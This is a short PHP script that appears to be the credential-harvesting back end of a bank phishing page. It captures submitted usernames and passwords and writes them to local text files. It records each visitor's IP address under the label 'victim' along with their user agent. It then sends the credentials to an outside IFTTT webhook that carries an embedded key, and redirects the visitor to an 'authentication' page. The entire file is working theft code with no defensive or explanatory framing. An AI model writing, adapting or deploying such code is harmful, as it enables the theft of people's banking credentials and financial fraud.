<?php
date_default_timezone_set("Africa/Kampala");
$Time = date("d/m/Y")." at ".date("h:i:sa");
$Username = $_POST['username'];
$Password = $_POST['password'];

file_put_contents("bank1.txt", "Account: " . $Username . " \nPassword: " . $Password . " \nOn: " . $Time . "\n===========================================\n", FILE_APPEND);

if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
    }
$useragent = " User-Agent: ";
$browser = $_SERVER['HTTP_USER_AGENT'];

$file = 'bank2.txt'; 
$victim = "Public IP: ";
$fp = fopen($file, 'a');

fwrite($fp, $victim);
fwrite($fp, $ipaddress);
fwrite($fp, $useragent);
fwrite($fp, $browser);
fwrite($fp, "\n===========================================\n");
fclose($fp);

$url = 'http://maker.ifttt.com/trigger/stratagem_login/with/key/d53eY9NjQ-FNIEurV2OpEH';
$data = array('value1' => $Username, 'value2' => $Password);

$options = array(
    'http' => array(
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data)
    )
);
$context  = stream_context_create($options);
$result = file_get_contents($url, false, $context);
if ($result === FALSE) { /* Handle error */ }

header('Location: authentication/');
exit();

?>
